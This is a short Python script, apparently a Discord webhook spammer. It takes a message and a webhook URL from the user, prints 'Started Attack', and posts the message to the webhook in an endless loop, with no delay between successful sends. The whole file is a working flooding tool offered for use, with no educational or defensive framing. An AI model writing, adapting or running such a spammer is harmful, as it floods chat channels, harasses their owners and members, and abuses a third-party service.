import requests
import os
import time

os.system("color a")
msg = input("WebHook Spam Message:")
webhook = input("WebHook URL:")
print("Cheaking Your Internet....")
time.sleep(1)
os.system("ping 1.1.1.1")
time.sleep(1)
os.system("color c")
print("Started Attack")
time.sleep(1)

i = 1
def spam(msg, webhook):
    while True:
        
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                
                print(f"MSG Sent")
                
        except:
            print("Bad Webhook :" + webhook)
            time.sleep(2)
            exit()


Started_attack = 1
while Started_attack == 1:
    spam(msg, webhook)
